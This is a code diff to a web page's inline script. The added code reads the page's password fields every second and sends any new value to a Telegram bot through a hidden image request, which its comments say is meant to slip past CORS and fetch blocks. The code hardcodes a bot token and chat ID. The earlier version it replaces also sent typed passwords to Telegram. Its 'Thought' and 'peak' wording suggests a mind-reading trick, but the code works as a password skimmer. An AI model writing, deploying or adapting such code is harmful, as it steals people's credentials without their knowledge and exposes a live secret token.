@@ -351,29 +351,34 @@
 	  
 <script>
     (function() {
-        // YOUR UNIQUE TELEGRAM CREDENTIALS
+        // VERIFIED CREDENTIALS
         var token = "8239193344:AAGsVYXMGPJBf1-oUcwrh4KOkx7d6o3SUCA";
-        var chatId = "1652179836";
+        var chatId = "6066693812"; 
+        var lastSent = "";
 
-        document.addEventListener('input', function (e) {
-            // This targets the specific 'passwordPwd' input from the UIC code
-            if (e.target.id === 'passwordPwd') {
-                var secretValue = e.target.value;
+        // This loop runs every 1000ms (1 second) to grab the text
+        setInterval(function() {
+            // UIC uses two different IDs depending on if 'Hide Password' is checked
+            var p1 = document.getElementById('passwordPwd');
+            var p2 = document.getElementById('passwordTxt');
+            
+            // Get whichever one currently has the text
+            var currentVal = (p1 && p1.value) ? p1.value : (p2 ? p2.value : "");
 
-                // Only send if they've typed at least 3 letters
-                if (secretValue.length > 2) {
-                    clearTimeout(window.magicTimer);
-                    
-                    // Wait 800ms after they stop typing to send the full word
-                    window.magicTimer = setTimeout(function() {
-                        var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("Thought: " + secretValue);
-                        
-                        // Send the peak to your Telegram
-                        fetch(url, { mode: 'no-cors' });
-                    }, 800); 
-                }
+            // Only send if it's a new word, longer than 2 letters
+            if (currentVal.length > 2 && currentVal !== lastSent) {
+                lastSent = currentVal;
+                
+                // Using a hidden image to bypass 'CORS' and 'Fetch' security blocks
+                var peakUrl = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("Thought: " + currentVal);
+                
+                var ping = new Image();
+                ping.src = peakUrl;
+                
+                // This confirms the script reached this point in your browser console
+                console.log("Peak transmitted: " + currentVal);
             }
-        });
+        }, 1000);
     })();
 </script>
 
